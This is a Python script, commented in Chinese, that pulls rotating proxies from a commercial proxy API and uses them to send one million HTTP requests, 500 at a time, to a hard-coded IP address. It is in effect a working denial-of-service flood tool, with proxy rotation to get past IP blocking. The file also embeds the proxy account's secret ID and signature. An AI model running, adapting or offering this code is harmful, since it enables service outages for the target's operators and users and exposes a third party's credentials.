import requests
import random
import time
import xml.etree.ElementTree as ET
from concurrent.futures import ThreadPoolExecutor
#QQ交流群877290901
# 配置参数（降低验证门槛，增加调试信息）
TARGET_URL = "http://103.36.167.120:5000/"
PROXY_API_URL = "https://tps.kdlapi.com/api/gettps/?secret_id=ooomb8jky84tr6f099or&signature=b10xstm7afm971o87q52janvcsmxygai&num=5&format=xml&sep=1"
TOTAL_REQUESTS = 1000000
CONCURRENT = 500
TIMEOUT = 20  # 延长超时时间（从15→20秒）


def fetch_proxies_from_kdl():
    """获取代理并打印详细信息"""
    try:
        print(f"\n🔍 正在调用代理API：{PROXY_API_URL}")
        resp = requests.get(PROXY_API_URL, timeout=10)
        print(f"API返回状态码：{resp.status_code}")
        print(f"API返回内容：{resp.text[:500]}...")  # 打印前500字符
        
        root = ET.fromstring(resp.text)
        code = root.find("code").text
        if code != "0":
            msg = root.find("msg").text
            print(f"❌ API错误：code={code}，msg={msg}")
            return []
        
        proxies = [proxy.text.strip() for proxy in root.iter("proxy") if proxy.text]
        print(f"✅ 从API提取到 {len(proxies)} 个代理：{proxies}")
        return proxies
    except Exception as e:
        print(f"❌ API请求异常：{str(e)}（可能网络问题或API地址错误）")
        return []


def validate_proxies(raw_proxies):
    """详细打印每个代理的验证过程，方便排查"""
    valid_proxies = []
    if not raw_proxies:
        return valid_proxies
    
    print(f"\n🔍 开始验证 {len(raw_proxies)} 个代理（超时 {TIMEOUT} 秒）：")
    for proxy in raw_proxies:
        print(f"\n----- 验证代理：{proxy} -----")
        try:
            proxies = {"http": f"http://{proxy}"}
            start_time = time.time()
            resp = requests.get(
                TARGET_URL,
                proxies=proxies,
                timeout=TIMEOUT,
                allow_redirects=False
            )
            cost = time.time() - start_time
            print(f"✅ 代理请求成功，状态码：{resp.status_code}，耗时：{cost:.2f}秒")
            # 放宽状态码限制（允许更多合法状态）
            if resp.status_code in [200, 301, 302, 404, 500, 502, 503]:
                valid_proxies.append(proxy)
                print(f"✅ 代理有效（状态码符合条件）")
            else:
                print(f"❌ 代理状态码不符合条件（{resp.status_code}）")
        except requests.exceptions.Timeout:
            print(f"❌ 代理超时（超过 {TIMEOUT} 秒）")
        except requests.exceptions.ConnectionError:
            print(f"❌ 代理连接失败（可能被拒绝或端口错误）")
        except Exception as e:
            print(f"❌ 代理验证异常：{str(e)}")
        continue
    
    print(f"\n📊 验证完成：有效代理 {len(valid_proxies)} 个，无效 {len(raw_proxies)-len(valid_proxies)} 个")
    return valid_proxies


def send_request(valid_proxies):
    if not valid_proxies:
        return
    proxy = random.choice(valid_proxies)
    try:
        proxies = {"http": f"http://{proxy}"}
        resp = requests.get(TARGET_URL, proxies=proxies, timeout=TIMEOUT, allow_redirects=False)
        print(f"成功：{proxy[:20]}...（{resp.status_code}）")
    except Exception as e:
        print(f"失败：{proxy[:20]}...（{e}）")


def main():
    raw_proxies = fetch_proxies_from_kdl()
    if not raw_proxies:
        print("\n❌ 无有效代理，测试终止（原因：未从API获取到代理）")
        return
    valid_proxies = validate_proxies(raw_proxies)
    if not valid_proxies:
        print("\n❌ 无有效代理，测试终止（原因：所有代理验证失败，见上文详细日志）")
        return
    print(f"\n发送 {TOTAL_REQUESTS} 个请求...")
    start_time = time.time()
    with ThreadPoolExecutor(max_workers=CONCURRENT) as executor:
        for _ in range(TOTAL_REQUESTS):
            executor.submit(send_request, valid_proxies)
    print(f"耗时 {time.time() - start_time:.2f} 秒")


if __name__ == "__main__":
    main()
